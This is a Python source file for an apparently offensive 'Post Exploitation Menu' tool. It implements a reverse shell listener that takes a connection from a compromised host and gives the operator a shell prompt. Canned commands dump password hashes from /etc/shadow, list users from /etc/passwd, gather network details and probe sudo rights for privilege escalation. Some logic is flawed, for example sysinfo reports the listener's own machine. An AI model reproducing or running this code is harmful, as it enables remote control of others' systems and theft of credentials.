import os
import subprocess
import socket
import colorama
import platform
import getpass
import locale

colorama.init(autoreset=True)

class post_exploitationCommands:
    def __init__(self, RHOST, RPORT, conn):
        self.HOST = RHOST
        self.RPORT = RPORT
        self.conn = conn
    
    def print_help(self):
        help_text = """
        Available Commands:
        - sysinfo        : Get system information
        - dump hashes    : Dump password hashes
        - users          : List all users
        - network        : Show network information
        - privilege_check: Check for privilege escalation possibilities
        """
        self.conn.send(help_text.encode())

    def dump_hashes(self):
        self.conn.send(b'cat /etc/shadow')
        hash_dump = self.conn.recv(4096).decode()
        print('[+] Successfully Dumped All The Hashes:')
        print(hash_dump)

    def sysinfo(self):
        info = {
            "Computer": socket.gethostname(),
            "OS": f"{platform.system()} {platform.release()} ({platform.version()})",
            "Architecture": platform.machine(),
            "System Language": locale.getdefaultlocale()[0],
            "Domain": os.getenv("USERDOMAIN") or "N/A",
            "Logged On User": getpass.getuser(),
        }

        self.conn.send(b"[+] System Information:\n")
        for key, value in info.items():
            self.conn.send(f"{key:16}: {value}\n".encode())

    def users(self):
        # Linux example
        self.conn.send(b"cat /etc/passwd")
        user_list = self.conn.recv(4096).decode()
        print('[+] Successfully Fetched User List:')
        print(user_list)

    def network(self):
        # Show IP configuration and network connections
        self.conn.send(b"ifconfig")  # Use 'ipconfig' on Windows
        network_info = self.conn.recv(4096).decode()
        print('[+] Network Information:')
        print(network_info)

    def privilege_check(self):
        # Linux example: Check sudo permissions
        self.conn.send(b"sudo -l")
        sudo_permissions = self.conn.recv(4096).decode()
        if "not allowed" in sudo_permissions:
            print("[+] No sudo permissions.")
        else:
            print("[+] Sudo permissions granted. Possible privilege escalation.")

def Stupid_listener(lhost, lport):
    s = socket.socket()
    s.bind((lhost, int(lport)))
    s.listen(1)
    print(f"[+] Listening on {lhost}:{lport}...")
    conn, addr = s.accept()
    print(f"[+] Connection from {addr[0]}:{addr[1]}")

    while True:
        command = input("shell> ").strip()
        if command.lower() in ['exit', 'quit']:
            conn.send(b'exit')
            break

        if command.lower() == 'dump hashes':
            commands = post_exploitationCommands(addr[0], addr[1], conn)
            commands.dump_hashes()
            continue
        if command.lower() == "sysinfo":
            commands = post_exploitationCommands(addr[0], addr[1], conn)
            commands.sysinfo()
            continue
        if command.lower() == "users":
            commands = post_exploitationCommands(addr[0], addr[1], conn)
            commands.users()
            continue
        if command.lower() == "network":
            commands = post_exploitationCommands(addr[0], addr[1], conn)
            commands.network()
            continue
        if command.lower() == "privilege_check":
            commands = post_exploitationCommands(addr[0], addr[1], conn)
            commands.privilege_check()
            continue
        if command.lower() == "help":
            commands = post_exploitationCommands(addr[0], addr[1], conn)
            commands.print_help()
            continue

        if command:
            conn.send(command.encode())
            data = conn.recv(4096).decode()
            print(data)

    conn.close()
    s.close()

def run():
    print("\n===========================")
    print("   Post Exploitation Menu")
    print("===========================\n")
    print("[1] - Start Reverse Shell Listener")
    print("[2] - Exit")

    choice = input("post> ").strip()

    if choice == '1':
        from app import options
        Stupid_listener(options['LHOST'], options['LPORT'])

    if choice == '2':
        pass
